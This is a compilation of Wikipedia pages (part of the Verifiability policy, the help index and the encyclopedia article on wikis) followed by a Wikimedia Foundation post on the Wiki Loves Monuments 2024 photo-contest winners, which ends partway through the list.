EXCEPTIONAL CLAIMS REQUIRE EXCEPTIONAL SOURCING




Shortcuts
 * WP:REDFLAG
 * WP:EXCEPTIONAL
 * WP:ECREE

See also: Wikipedia:Fringe theories

Any exceptional claim requires multiple high-quality sources.[3] Warnings (red flags) that should prompt extra caution include:

 * Surprising or apparently important claims not covered by multiple mainstream sources;
 * Challenged claims that are supported purely by primary or self-published sources or those with an apparent conflict of interest;
 * Reports of a statement by someone that seems out of character or against an interest they had previously defended;
 * Claims contradicted by the prevailing view within the relevant community or that would significantly alter mainstream assumptions—especially in science, medicine, history, politics, and biographies of living and recently dead people. This is especially true when proponents say there is a conspiracy to silence them.


VERIFIABILITY AND OTHER PRINCIPLES


COPYRIGHT AND PLAGIARISM

Further information: Wikipedia:Copyright, Wikipedia:Plagiarism, Wikipedia:Copying within Wikipedia, Wikipedia:MOS § Attribution, and Wikipedia:CITE § In-text attribution

Shortcut
 * WP:OWNWORDS

Do not plagiarize or breach copyright when using sources. Summarize source material in your own words as much as possible; when quoting or closely paraphrasing a source, use an inline citation, and in-text attribution where appropriate.

Do not link to any source that violates the copyrights of others per contributors' rights and obligations. You can link to websites that display copyrighted works as long as the website has licensed the work or uses the work in a way compliant with fair use. Knowingly directing others to material that violates copyright may be considered contributory copyright infringement. If there is reason to think a source violates copyright, do not cite it. This is particularly relevant when linking to sites such as Scribd or YouTube, where due care should be taken to avoid linking to material violating copyright.


NEUTRALITY

Further information: Wikipedia:Neutral point of view

Shortcut
 * WP:SOURCESDIFFER

Even when information is cited to reliable sources, you must present it with a neutral point of view (NPOV). Articles should be based on thorough research of sources. All articles must adhere to NPOV, fairly representing all majority and significant-minority viewpoints published by reliable sources, in rough proportion to the prominence of each view. Tiny-minority views need not be included, except in articles devoted to them. If there is a disagreement between sources, use in-text attribution: "John Smith argues X, while Paul Jones maintains Y," followed by an inline citation. Sources themselves do not need to maintain a neutral point of view. Indeed, many reliable sources are not neutral. Our job as editors is simply to summarize what reliable sources say.


NOTABILITY

Further information: Wikipedia:Notability

If no reliable, independent sources can be found on a topic, Wikipedia should not have an article on it (i.e., the topic is not notable). However, notability is based on the existence of suitable sources, not on the state of sourcing in an article.


ORIGINAL RESEARCH

Further information: Wikipedia:No original research

The no original research policy (NOR) is closely related to the Verifiability policy. Among its requirements are:

 1. All material in Wikipedia articles must be attributable to a reliable published source. This means a reliable published source must exist for it, whether or not it is cited in the article.
 2. Sources must support the material clearly and directly: drawing inferences from multiple sources to advance a novel position is prohibited by the NOR policy.[h]
 3. Base articles largely on reliable secondary sources. While primary sources are appropriate in some cases, relying on them can be problematic. For more information, see the Primary, secondary, and tertiary sources section of the NOR policy, and the Misuse of primary sources section of the BLP policy.

NOTES

 1. ^ This principle was previously expressed on this policy page as "the threshold for inclusion is verifiability, not truth". See the essay, Wikipedia:Verifiability, not truth.
 2. ^ a b c A source "directly supports" a given piece of material if the information is present explicitly in the source, so that using this source to support the material is not a violation of Wikipedia:No original research. The location of any citation—including whether one is present in the article at all—is unrelated to whether a source directly supports the material. For questions about where and how to place citations, see Wikipedia:Citing sources, Wikipedia:Manual of Style/Lead section § Citations, etc.
 3. ^ Once an editor has provided any source they believe, in good faith, to be sufficient, then any editor who later removes the material must articulate specific problems that would justify its exclusion from Wikipedia (e.g., why the source is unreliable; the source does not support the claim; undue emphasis; unencyclopedic content; etc.). If necessary, all editors are then expected to help achieve consensus, and any problems with the text or sourcing should be fixed before the material is added back.
 4. ^ It may be that the article contains so few citations it is impractical to add specific citation needed tags. Consider then tagging a section with {{unreferenced section}}, or the article with the applicable of either {{unreferenced}} or {{more citations needed}}. For a disputed category, you may use {{unreferenced category}}. For a disambiguation page, consider asking for a citation on the talk page.
 5. ^ When tagging or removing such material, please communicate your reasons why. Some editors object to others making frequent and large-scale deletions of unsourced information, especially if unaccompanied by other efforts to improve the material. Do not concentrate only on material of a particular point of view, as that may appear to be a contravention of Wikipedia:Neutral point of view. Also, check to see whether the material is sourced to a citation elsewhere on the page. For all these reasons, it is advisable to clearly communicate that you have a considered reason to believe the material in question cannot be verified
 6. ^ This includes material such as documents in publicly accessible archives as well as inscriptions in plain sight, e.g. tombstones.
 7. ^ a b Note that any exceptional claim would require exceptional sources.
 8. ^ a b When there is a dispute as to whether a piece of text is fully supported by a given source, direct quotes and other relevant details from the source should be provided to other editors as a courtesy. Do not violate the source's copyright when doing so.


REFERENCES

 1. ^ Self-published material is characterized by the lack of independent reviewers (those without a conflict of interest) validating the reliability of the content. Further examples of self-published sources include press releases, the material contained within company websites, advertising campaigns, material published in media by the owner(s)/publisher(s) of the media group, self-released music albums, and electoral manifestos:
     * The University of California, Berkeley, library states: "Most pages found in general search engines for the web are self-published or published by businesses small and large with motives to get you to buy something or believe a point of view. Even within university and library web sites, there can be many pages that the institution does not try to oversee."
     * Princeton University offers this understanding in its publication, Academic Integrity at Princeton (2011): "Unlike most books and journal articles, which undergo strict editorial review before publication, much of the information on the Web is self-published. To be sure, there are many websites in which you can have confidence: mainstream newspapers, refereed electronic journals, and university, library, and government collections of data. But for vast amounts of Web-based information, no impartial reviewers have evaluated the accuracy or fairness of such material before it's made instantly available across the globe."
     * The "College of St. Catherine Libraries Guide to Chicago Manual of Style" (DEKloiber, December 1, 2003) states, "Any site that does not have a specific publisher or sponsoring body should be treated as unpublished or self-published work."

This page provides help with the most common questions about Wikipedia.

You can also search Wikipedia's help pages using the search box below, or browse the Help menu or the Help directory.


Help Wikipedia


READ OR FIND AN ARTICLE

The Readers' FAQ and our about page contain the most commonly sought information about Wikipedia.

For simple searches, there is a search bar at the top of every page. Type what you are looking for in the box. Suggested matches will appear in a dropdown list. Select any page in the list to go to that page. Or, select the "Search" button, or press ↵ Enter, to go to a full search result. For advanced searches, see Help:Searching.

There are other ways to browse and explore Wikipedia articles; many can be found at Wikipedia:Contents. See our disclaimer for cautions about Wikipedia's limitations.

For mobile access, press the mobile view link at the very bottom of every desktop view page.


EDIT AN ARTICLE

Contributing is easy: see how to edit a page. For a quick summary on participating, see contributing to Wikipedia, and for a friendly tutorial, see our introduction. For a listing of introductions and tutorials by topic, see getting started. The Simplified Manual of Style and Cheatsheet can remind you of basic wiki markup.

Be bold in improving articles! When adding facts, please provide references so others may verify them. If you are affiliated with the article subject, please see our conflict of interest guideline.

The simple guide to vandalism cleanup can help you undo malicious edits.

If you're looking for places you can help out, the Task Center is the place to go, or check out what else is happening at the community portal. You can practice editing and experiment in a sandboxyour sandbox.


REPORT A PROBLEM WITH AN ARTICLE

If there is a problem with an article about yourself, a family member, a friend or a colleague, please read Biographies of living persons/Help.

If you spot a problem with an article, you can fix it directly, by clicking on the "Edit" link at the top of that page. See the "edit an article" section of this page for more information.

If you don't feel ready to fix the article yourself, post a message on the article's talk page. This will bring the matter to the attention of others who work on that article. There is a "Talk" link at the beginning of every article page.

You can contact us. If it's an article about you or your organization, see Contact us – Subjects.


CREATE A NEW ARTICLE OR UPLOAD MEDIA

Check Your first article to see if your topic is appropriate, then the Article wizard will walk you through creating the article.

Once you have created an article, see Writing better articles for guidance on how to improve it and what to include (like reference citations).

For contributing images, audio or video files, see the Introduction to uploading images. Then the Upload wizard will guide you through that process.


FAQ AND INTERACTIVE HELP

Answers to common problems can be found at frequently asked questions.

Or check out where to ask questions or make comments.

New users should seek help at the Teahouse if they're having problems while editing Wikipedia.

More complex questions can be posed at the Help desk. Volunteers will respond as soon as they're able.

Or ask for help on your talk page and a volunteer will visit you there!

You can get live help with editing in the help chatroom.

For help with technical issues, ask at the Village pump.

Type of website edited collaboratively



This article is about the concept. For its use as a nickname, see Wikipedia. For other uses, see Wiki (disambiguation).
Not to be confused with Wiiki or WIKY.



Editing display showing MediaWiki markup language

A wiki (/ˈwɪki/ ⓘ WICK-ee) is a form of hypertext publication on the internet which is collaboratively edited and managed by its audience directly through a web browser. A typical wiki contains multiple pages that can either be edited by the public or limited to use within an organization for maintaining its internal knowledge base.

Wikis are powered by wiki software, also known as wiki engines. Being a form of content management system, these differ from other web-based systems such as blog software or static site generators in that the content is created without any defined owner or leader. Wikis have little inherent structure, allowing one to emerge according to the needs of the users.[1] Wiki engines usually allow content to be written using a lightweight markup language and sometimes edited with the help of a rich-text editor.[2] There are dozens of different wiki engines in use, both standalone and part of other software, such as bug tracking systems. Some wiki engines are free and open-source, whereas others are proprietary. Some permit control over different functions (levels of access); for example, editing rights may permit changing, adding, or removing material. Others may permit access without enforcing access control. Further rules may be imposed to organize content. In addition to hosting user-authored content, wikis allow those users to interact, hold discussions, and collaborate.[3]

There are hundreds of thousands of wikis in use, both public and private, including wikis functioning as knowledge management resources, note-taking tools, community websites, and intranets. Ward Cunningham, the developer of the first wiki software, WikiWikiWeb, originally described wiki as "the simplest online database that could possibly work".[4] "Wiki" (pronounced [wiki][note 1]) is a Hawaiian word meaning "quick".[5][6][7]

The online encyclopedia project Wikipedia is the most popular wiki-based website, as well being one of the internet's most popular websites, having been ranked consistently as such since at least 2007.[8] Wikipedia is not a single wiki but rather a collection of hundreds of wikis, with each one pertaining to a specific language, making it the largest reference work of all time.[9] The English-language Wikipedia has the largest collection of articles, standing at 6,981,203 as of April 2025.[10]


CHARACTERISTICS

Ward Cunningham

In their 2001 book The Wiki Way: Quick Collaboration on the Web, Cunningham and co-author Bo Leuf described the essence of the wiki concept:[11][12]

 * "A wiki invites all users—not just experts—to edit any page or to create new pages within the wiki website, using only a standard 'plain-vanilla' Web browser without any extra add-ons."
 * "Wiki promotes meaningful topic associations between different pages by making page link creation intuitively easy and showing whether an intended target page exists or not."
 * "A wiki is not a carefully crafted site created by experts and professional writers and designed for casual visitors. Instead, it seeks to involve the typical visitor/user in an ongoing process of creation and collaboration that constantly changes the website landscape."


EDITING

"Wikitext" redirects here. For the Wikipedia help page, see Help:Wikitext.

SOURCE EDITING

Some wikis will present users with an edit button or link directly on the page being viewed. This will open an interface for writing, formatting, and structuring page content. The interface may be a source editor, which is text-based and employs a lightweight markup language (also known as wikitext, wiki markup, or wikicode), or a visual editor. For example, in a source editor, starting lines of text with asterisks could create a bulleted list.

The syntax and features of wiki markup languages for denoting style and structure can vary greatly among implementations. Some allow the use of HTMLTooltip Hypertext Markup Language and CSSTooltip Cascading Style Sheets,[13] while others prevent the use of these to foster uniformity in appearance.

EXAMPLE OF SYNTAX

A short section of Alice's Adventures in Wonderland rendered in wiki markup:

Wiki markup Equivalent in HTML Output shown to readers

"Take some more [[tea]]," the March Hare said to Alice, very earnestly.

"I've had '''nothing''' yet," Alice replied in an offended tone, "so I can't take more."

"You mean you can't take ''less''," said the Hatter. "It's very easy to take ''more'' than nothing."


"Take some more <a href="/wiki/Tea" title="Tea">tea</a>," the March Hare said to Alice, very earnestly.

<p>"I've had <strong>nothing</strong> yet," Alice replied in an offended tone, "so I can't take more."

<p>"You mean you can't take <em>less</em>," said the Hatter. "It's very easy to take <em>more</em> than nothing."



"Take some more tea," the March Hare said to Alice, very earnestly.

"I've had nothing yet," Alice replied in an offended tone, "so I can't take more."

"You mean you can't take less," said the Hatter. "It's very easy to take more than nothing."



VISUAL EDITING

While wiki engines have traditionally offered source editing to users, in recent years some implementations have added a rich text editing mode. This is usually implemented, using JavaScript, as an interface which translates formatting instructions chosen from a toolbar into the corresponding wiki markup or HTML. This is generated and submitted to the server transparently, shielding users from the technical detail of markup editing and making it easier for them to change the content of pages. An example of such an interface is the VisualEditor in MediaWiki, the wiki engine used by Wikipedia. WYSIWYG editors may not provide all the features available in wiki markup, and some users prefer not to use them, so a source editor will often be available simultaneously.

VERSION HISTORY

Some wiki implementations keep a record of changes made to wiki pages, and may store every version of the page permanently. This allows authors to revert a page to an older version to rectify a mistake, or counteract a malicious or inappropriate edit to its content.[14]

These stores are typically presented for each page in a list, called a "log" or "edit history", available from the page via a link in the interface. The list displays metadata for each revision to the page, such as the time and date of when it was stored, and the name of the person who created it, alongside a link to view that specific revision. A diff (short for "difference") feature may be available, which highlights the changes between any two revisions.

EDIT SUMMARIES

"Edit summary" redirects here. For the Wikipedia help page, see Help:Edit summary.

The edit history view in many wiki implementations will include edit summaries written by users when submitting changes to a page. Similar to the function of a log message in a revision control system, an edit summary is a short piece of text which summarizes and perhaps explains the change, for example "Corrected grammar" or "Fixed table formatting to not extend past page width". It is not inserted into the article's main text.


NAVIGATION

Traditionally, wikis offer free navigation between their pages via hypertext links in page text, rather than requiring users to follow a formal or structured navigation scheme. Users may also create indexes or table of contents pages, hierarchical categorization via a taxonomy, or other forms of ad hoc content organization. Wiki implementations can provide one or more ways to categorize or tag pages to support the maintenance of such index pages, such as a backlink feature which displays all pages that link to a given page. Adding categories or tags to a page makes it easier for other users to find it.

Most wikis allow the titles of pages to be searched amongst, and some offer full text search of all stored content.

NAVIGATION BETWEEN WIKIS

"WikiNode" redirects here. For the app for the Apple iPad, see WikiNodes.

Some wiki communities have established navigational networks between each other using a system called WikiNodes. A WikiNode is a page on a wiki which describes and links to other, related wikis. Some wikis operate a structure of neighbors and delegates, wherein a neighbor wiki is one which discusses similar content or is otherwise of interest, and a delegate wiki is one which has agreed to have certain content delegated to it.[15] WikiNode networks act as webrings which may be navigated from one node to another to find a wiki which addresses a specific subject.


LINKING TO AND NAMING PAGES

The syntax used to create internal hyperlinks varies between wiki implementations. Beginning with the WikiWikiWeb in 1995, most wikis used camel case to name pages,[16] which is when words in a phrase are capitalized and the spaces between them removed. In this system, the phrase "camel case" would be rendered as "CamelCase". In early wiki engines, when a page was displayed, any instance of a camel case phrase would be transformed into a link to another page named with the same phrase.

While this system made it easy to link to pages, it had the downside of requiring pages to be named in a form deviating from standard spelling, and titles of a single word required abnormally capitalizing one of the letters (e.g. "WiKi" instead of "Wiki"). Some wiki implementations attempt to improve the display of camel case page titles and links by reinserting spaces and possibly also reverting to lower case, but this simplistic method is not able to correctly present titles of mixed capitalization. For example, "Kingdom of France" as a page title would be written as "KingdomOfFrance", and displayed as "Kingdom Of France".

To avoid this problem, the syntax of wiki markup gained free links, wherein a term in natural language could be wrapped in special characters to turn it into a link without modifying it. The concept was given the name in its first implementation, in UseModWiki in February 2001.[17] In that implementation, link terms were wrapped in a double set of square brackets, for example [[Kingdom of France]]. This syntax was adopted by a number of later wiki engines.

It is typically possible for users of a wiki to create links to pages that do not yet exist, as a way to invite the creation of those pages. Such links are usually differentiated visually in some fashion, such as being colored red instead of the default blue, which was the case in the original WikiWikiWeb, or by appearing as a question mark next to the linked words.


HISTORY

Main article: History of wikis
Wiki Wiki Shuttle at Honolulu International Airport

WikiWikiWeb was the first wiki.[18] Ward Cunningham started developing it in 1994, and installed it on the Internet domain c2.com on March 25, 1995. Cunningham gave it the name after remembering a Honolulu International Airport counter employee telling him to take the "Wiki Wiki Shuttle" bus that runs between the airport's terminals, later observing that "I chose wiki-wiki as an alliterative substitute for 'quick' and thereby avoided naming this stuff quick-web."[19][20]

Cunningham's system was inspired by his having used Apple's hypertext software HyperCard, which allowed users to create interlinked "stacks" of virtual cards.[21] HyperCard, however, was single-user, and Cunningham was inspired to build upon the ideas of Vannevar Bush, the inventor of hypertext, by allowing users to "comment on and change one another's text."[2][22] Cunningham says his goals were to link together people's experiences to create a new literature to document programming patterns, and to harness people's natural desire to talk and tell stories with a technology that would feel comfortable to those not used to "authoring".[21]

Wikipedia became the most famous wiki site[clarification needed], launched in January 2001 and entering the top ten most popular websites in 2007. In the early 2000s, wikis were increasingly adopted in enterprise as collaborative software. Common uses included project communication, intranets, and documentation, initially for technical users. Some companies use wikis as their collaborative software and as a replacement for static intranets, and some schools and universities use wikis to enhance group learning. On March 15, 2007, the word wiki was listed in the online Oxford English Dictionary.[23]


ALTERNATIVE DEFINITIONS

In the late 1990s and early 2000s, the word "wiki" was used to refer to both user-editable websites and the software that powers them, and the latter definition is still occasionally in use.[1]

By 2014, Ward Cunningham's thinking on the nature of wikis had evolved, leading him to write[24] that the word "wiki" should not be used to refer to a single website, but rather to a mass of user-editable pages or sites so that a single website is not "a wiki" but "an instance of wiki". In this concept of wiki federation, in which the same content can be hosted and edited in more than one location in a manner similar to distributed version control, the idea of a single discrete "wiki" no longer made sense.[25]


IMPLEMENTATIONS

See also: List of wiki software

The software which powers a wiki may be implemented as a series of scripts which operate an existing web server, a standalone application server that runs on one or more web servers, or in the case of personal wikis, run as a standalone application on a single computer. Some wikis use flat file databases to store page content, while others use a relational database,[26] as indexed database access is faster on large wikis, particularly for searching.


HOSTING

See also: Comparison of wiki hosting services

Wikis can also be created on wiki hosting services (also known as wiki farms), where the server-side software is implemented by the wiki farm owner, and may do so at no charge in exchange for advertisements being displayed on the wiki's pages. Some hosting services offer private, password-protected wikis requiring authentication to access. Free wiki farms generally contain advertising on every page.


TRUST AND SECURITY


ACCESS CONTROL

The four basic types of users who participate in wikis are readers, authors, wiki administrators and system administrators. System administrators are responsible for the installation and maintenance of the wiki engine and the container web server. Wiki administrators maintain content and, through having elevated privileges, are granted additional functions (including, for example, preventing edits to pages, deleting pages, changing users' access rights, or blocking them from editing).[27]


CONTROLLING CHANGES

"Recent changes" redirects here. For the Wikipedia help page, see Help:Recent changes. For the recent changes page itself, see Special:RecentChanges.
History comparison reports highlight the changes between two revisions of a page.

Wikis are generally designed with a soft security philosophy in which it is easy to correct mistakes or harmful changes, rather than attempting to prevent them from happening in the first place. This allows them to be very open while providing a means to verify the validity of recent additions to the body of pages. Most wikis offer a recent changes page which shows recent edits, or a list of edits made within a given time frame.[28] Some wikis can filter the list to remove edits flagged by users as "minor" and automated edits.[29] The version history feature allows harmful changes to be reverted quickly and easily.[14]

Some wiki engines provide additional content control, allowing remote monitoring and management of a page or set of pages to maintain quality. A person willing to maintain pages will be alerted of modifications to them, allowing them to verify the validity of new editions quickly.[30] Such a feature is often called a watchlist.

Some wikis also implement patrolled revisions, in which editors with the requisite credentials can mark edits as being legitimate. A flagged revisions system can prevent edits from going live until they have been reviewed.[31]

Wikis may allow any person on the web to edit their content without having to register an account on the site first (anonymous editing), or require registration as a condition of participation.[32] On implementations where an administrator is able to restrict editing of a page or group of pages to a specific group of users, they may have the option to prevent anonymous editing while allowing it for registered users.[33]


TRUSTWORTHINESS AND RELIABILITY OF CONTENT

Critics of publicly editable wikis argue that they could be easily tampered with by malicious individuals, or even by well-meaning but unskilled users who introduce errors into the content. Proponents maintain that these issues will be caught and rectified by a wiki's community of users.[2][18] High editorial standards in medicine and health sciences articles, in which users typically use peer-reviewed journals or university textbooks as sources, have led to the idea of expert-moderated wikis.[34] Wiki implementations retaining and allowing access to specific versions of articles has been useful to the scientific community, by allowing expert peer reviewers to provide links to trusted version of articles which they have analyzed.[35]


SECURITY

"Edit war" redirects here; not to be confused with Edit conflict. For Wikipedia's policy on edit warring, see Wikipedia:Edit warring.

Trolling and cybervandalism on wikis, where content is changed to something deliberately incorrect or a hoax, offensive material or nonsense is added, or content is maliciously removed, can be a major problem. On larger wiki sites it is possible for such changes to go unnoticed for a long period.

In addition to using the approach of soft security for protecting themselves, larger wikis may employ sophisticated methods, such as bots that automatically identify and revert vandalism. For example, on Wikipedia, the bot ClueBot NG uses machine learning to identify likely harmful changes, and reverts these changes within minutes or even seconds.[36]

Disagreements between users over the content or appearance of pages may cause edit wars, where competing users repetitively change a page back to a version that they favor. Some wiki software allows administrators to prevent pages from being editable until a decision has been made on what version of the page would be most appropriate.[3]

Some wikis may be subject to external structures of governance which address the behavior of persons with access to the system, for example in academic contexts.[26]

HARMFUL EXTERNAL LINKS

As most wikis allow the creation of hyperlinks to other sites and services, the addition of malicious hyperlinks, such as sites infected with malware, can also be a problem. For example, in 2006 a German Wikipedia article about the Blaster Worm was edited to include a hyperlink to a malicious website, and users of vulnerable Microsoft Windows systems who followed the link had their systems infected with the worm.[3] Some wiki engines offer a blacklist feature which prevents users from adding hyperlinks to specific sites that have been placed on the list by the wiki's administrators.


COMMUNITIES


APPLICATIONS

The home page of the English Wikipedia

The English Wikipedia has the largest user base among wikis on the World Wide Web[37] and ranks in the top 10 among all Web sites in terms of traffic.[38] Other large wikis include the WikiWikiWeb, Memory Alpha, Wikivoyage, and previously Susning.nu, a Swedish-language knowledge base. Medical and health-related wiki examples include Ganfyd, an online collaborative medical reference that is edited by medical professionals and invited non-medical experts.[39] Many wiki communities are private, particularly within enterprises. They are often used as internal documentation for in-house systems and applications. Some companies use wikis to allow customers to help produce software documentation.[40] A study of corporate wiki users found that they could be divided into "synthesizers" and "adders" of content. Synthesizers' frequency of contribution was affected more by their impact on other wiki users, while adders' contribution frequency was affected more by being able to accomplish their immediate work.[41] From a study of thousands of wiki deployments, Jonathan Grudin concluded careful stakeholder analysis and education are crucial to successful wiki deployment.[42]

In 2005, the Gartner Group, noting the increasing popularity of wikis, estimated that they would become mainstream collaboration tools in at least 50% of companies by 2009.[43][needs update] Wikis can be used for project management.[44][45][unreliable source] Wikis have also been used in the academic community for sharing and dissemination of information across institutional and international boundaries.[46] In those settings, they have been found useful for collaboration on grant writing, strategic planning, departmental documentation, and committee work.[47] In the mid-2000s, the increasing trend among industries toward collaboration placed a heavier impetus upon educators to make students proficient in collaborative work, inspiring even greater interest in wikis being used in the classroom.[3]

Wikis have found some use within the legal profession and within the government. Examples include the Central Intelligence Agency's Intellipedia, designed to share and collect intelligence assessments, DKosopedia, which was used by the American Civil Liberties Union to assist with review of documents about the internment of detainees in Guantánamo Bay;[48] and the wiki of the United States Court of Appeals for the Seventh Circuit, used to post court rules and allow practitioners to comment and ask questions. The United States Patent and Trademark Office operates Peer-to-Patent, a wiki to allow the public to collaborate on finding prior art relevant to the examination of pending patent applications. Queens, New York has used a wiki to allow citizens to collaborate on the design and planning of a local park. Cornell Law School founded a wiki-based legal dictionary called Wex, whose growth has been hampered by restrictions on who can edit.[33]

In academic contexts, wikis have also been used as project collaboration and research support systems.[49][50]

CITY WIKIS

A city wiki or local wiki is a wiki used as a knowledge base and social network for a specific geographical locale.[51][52][53] The term city wiki is sometimes also used for wikis that cover not just a city, but a small town or an entire region. Such a wiki contains information about specific instances of things, ideas, people and places. Such highly localized information might be appropriate for a wiki targeted at local viewers, and could include:

 * Details of public establishments such as public houses, bars, accommodation or social centers
 * Owner name, opening hours and statistics for a specific shop
 * Statistical information about a specific road in a city
 * Flavors of ice cream served at a local ice cream parlor
 * A biography of a local mayor and other persons


GROWTH FACTORS

A study of several hundred wikis in 2008 showed that a relatively high number of administrators for a given content size is likely to reduce growth;[54] access controls restricting editing to registered users tends to reduce growth; a lack of such access controls tends to fuel new user registration; and that a higher ratio of administrators to regular users has no significant effect on content or population growth.[55]


LEGAL ENVIRONMENT

Joint authorship of articles, in which different users participate in correcting, editing, and compiling the finished product, can also cause editors to become tenants in common of the copyright, making it impossible to republish without permission of all co-owners, some of whose identities may be unknown due to pseudonymous or anonymous editing.[3] Some copyright issues can be alleviated through the use of an open content license. Version 2 of the GNU Free Documentation License includes a specific provision for wiki relicensing, and Creative Commons licenses are also popular. When no license is specified, an implied license to read and add content to a wiki may be deemed to exist on the grounds of business necessity and the inherent nature of a wiki.

Wikis and their users can be held liable for certain activities that occur on the wiki. If a wiki owner displays indifference and forgoes controls (such as banning copyright infringers) that they could have exercised to stop copyright infringement, they may be deemed to have authorized infringement, especially if the wiki is primarily used to infringe copyrights or obtains a direct financial benefit, such as advertising revenue, from infringing activities.[3] In the United States, wikis may benefit from Section 230 of the Communications Decency Act, which protects sites that engage in "Good Samaritan" policing of harmful material, with no requirement on the quality or quantity of such self-policing.[56] It has also been argued that a wiki's enforcement of certain rules, such as anti-bias, verifiability, reliable sourcing, and no-original-research policies, could pose legal risks.[57] When defamation occurs on a wiki, theoretically, all users of the wiki can be held liable, because any of them had the ability to remove or amend the defamatory material from the "publication". It remains to be seen whether wikis will be regarded as more akin to an internet service provider, which is generally not held liable due to its lack of control over publications' contents, than a publisher.[3] It has been recommended that trademark owners monitor what information is presented about their trademarks on wikis, since courts may use such content as evidence pertaining to public perceptions, and they can edit entries to rectify misinformation.[58]


CONFERENCES

Active conferences and meetings about wiki-related topics include:

 * Atlassian Summit, an annual conference for users of Atlassian software, including Confluence.[59]
 * OpenSym (called WikiSym until 2014), an academic conference dedicated to research about wikis and open collaboration.
 * SMWCon, a bi-annual conference for users and developers of Semantic MediaWiki.[60]
 * TikiFest, a frequently held meeting for users and developers of Tiki Wiki CMS Groupware.[61]
 * Wikimania, an annual conference dedicated to the research and practice of Wikimedia Foundation projects like Wikipedia.

Former wiki-related events include:

 * RecentChangesCamp (2006–2012), an unconference on wiki-related topics.
 * RegioWikiCamp (2009–2013), a semi-annual unconference on "regiowikis", or wikis on cities and other geographic areas.[62]

NOTES

 1. ^ The realization of the Hawaiian /w/ phoneme varies between [w] and [v], and the realization of the /k/ phoneme varies between [k] and [t], among other realizations. Thus, the pronunciation of the Hawaiian word wiki varies between ['wiki], ['witi], ['viki], and ['viti]. See Hawaiian phonology for more details.

“REDEMPTION”: THE WINNERS OF WIKI LOVES MONUMENTS 2024

By Wikimedia Foundation•8 April 2025
Share
Facebook Twitter Bluesky LinkedIn Email Copy Link Link copied

Out of nearly 240,000 submissions, 25 winning images were announced today in the fifteenth edition of the world’s largest photography contest.

Great photography is more than pressing a button—transforming ordinary into extraordinary is an art. Timing, composition, and instinct must all harmonize at singular moments in time. Split-second decisions must be made to adjust focus and angle, all while maintaining the patience needed to capture the right light.

Donatas Dabravolskas, the winner of this year’s Wiki Loves Monuments photo contest, put all the pieces together early one morning last April. Although clouds threatened his chance to shoot Rio de Janeiro’s world-famous Christ the Redeemer, he ignored his doubts and hailed a car. When the clouds subsided, Dabravolskas and his drone were ready; he snapshotted a remarkable view of the statue lit by a rising sun reflecting off the-now low rolling clouds.

One contest judge said that Dabravolskas’s work brought together “the landscape, the backlight and the open frame in dialogue” in a way that conveyed “the concept of redemption”—just like the name of the statue. Dabravolskas was also the winner of Wiki Loves Monuments 2021, making him the first two-time winner of the contest.

—

Wiki Loves Monuments is best known for being the world’s largest photo contest. It highlights and documents humanity’s cultural heritage through the buildings, structures, and other assets that have gained importance due to their artistic, historic, political, technical, or architectural significance. 

This mission and its goals have “brought together people from literally all over the world,” their organizing team said. One of them is this year’s ninth-place winner Hadi Dehghanpour, who said that they submit photos to the contest each year because they “consider it a reference and source for introducing and archiving the world’s sights.” 

In 2024, over 4,500 participants in 56 countries submitted nearly 240,000 photos to Wiki Loves Monuments. These photos were first judged in individual nation-level contests, each organized by teams within those countries, before 55 finalists were forwarded to a nine-person expert jury, who took several months to closely examine and identify 25 winners.

Over its fifteen years in existence, Wiki Loves Monuments photographers have collectively donated over three million images to Wikimedia Commons, a freely licensed media repository that supports Wikipedia and other websites. Each photo adds another nugget of knowledge to the world’s collection, and you (yes, you!) can use those images for just about any purpose with only a few stipulations.* 

Check out all of the winners from the 2024 Wiki Love Monuments contest below.




SECOND PLACE

Photo by Oleksandr Ryzhkov, CC BY-SA 4.0

A symbol of Ukrainian education, Kyiv’s Red University Building was photographed on this cold evening by Oleksandr Ryzhkov. Although he is more likely to be found photographing natural beauty, Ryzhkov was motivated to turn his camera on Kyiv due to the destruction wrought by Ukraine’s ongoing war with Russia. “I want the whole world to see how beautiful it is here and remember that it can be destroyed,” he said.




THIRD PLACE

Photo by Ioannis Ioannidis, CC BY 4.0

Ioannis Ioannidis had only taken up photography a year before capturing this shot of birds flying around Greece’s Monastery of Rousanou. They and a friend were already going to travel south for a business trip, so they woke up early to take a detour to this religious building that is precariously perched on a rock outcropping. In the words of Wiki Loves Monument’s judges, Ioannidis’ photo “vividly captured both natural and human history in a single frame.” They commended the photo’s color, noting that the pinks “created a fantastic atmosphere that feels almost mythical.”




FOURTH PLACE

Photo by Petar Milošević, CC BY-SA 4.0

This is Serbia’s Museum of Contemporary Art as seen through the lens of long-time Wikipedia editor and Wikimedia Commons photographer Petar Milošević. Milošević’s motivation was simple: he wanted to demonstrate that Brutalist socialist architecture is “not just poor concrete”. The contest judges certainly believed that Milošević was successful in this quest, as they commended his compositional choices. These included the use of height to convey the museum’s architecture in a way “that cannot be appreciated from any other angle”, as well as Milošević’s decision to photograph the building when lit by its own lighting to best see its sharp lines.




FIFTH PLACE

Photo by Filipe Salgado, CC BY-SA 4.0

A prolific black and white photographer, Filipe Salgado’s haunting portrait of a single individual in Porto’s typically bustling Bolhão Market looks like it could have been taken in a different century. The contest judges called out the photo’s clever and symmetrical perspective, while Afsalgado themselves thought that it portrayed “a unique moment in a powerful way”. Their skills managed to place two photos in the top 25 of this year’s Wiki Loves Monuments; you can find their other winner at #11




SIXTH PLACE

Photo by Marika Caruana, CC BY-SA 4.0

Photographer Marika Caruana narrated the story behind this photo from Malta for the contest organizers:

> “The moment I took this shot was a crazy moment.  My partner and I were on our way back home feeling disappointed after an unsuccessful attempt to photograph moonrise at a low elevation.  Due to the haze on the horizon, the moon was not visible.  However, as the moon rose out of the haze, it shone nice and bright.  My partner was driving, so I took the opportunity to seek some interesting photographic composition with the full moon and a prominent building.  And as we neared the Mellieha Church, I realised that this was possible.  I asked my partner to stop the car in the middle of the road, ran out camera in hand and raced along the sidewalk (fortunately there is a promenade which permitted these antics) until I got the moon aligned with the dome.”




SEVENTH PLACE

Photo by Gilad Topaz, CC BY-SA 4.0

This dragon-style Norwegian church in the Lofoten island chain stood out to the judges for its composition. The red of the church pops against the surrounding snow-covered land, but the size of the building does not overwhelm the rest of the image. Photographer Gilad Topaz’s winter trip to these Norwegian islands involved three flights and an additional four hours of driving, and it paid off: three photos Gilad took on this trip won international awards in Wiki Loves Monuments 2024 and appear on this list (#12 and #17).




EIGHTH PLACE

Photo by User:Ivanbuki, CC BY-SA 4.0

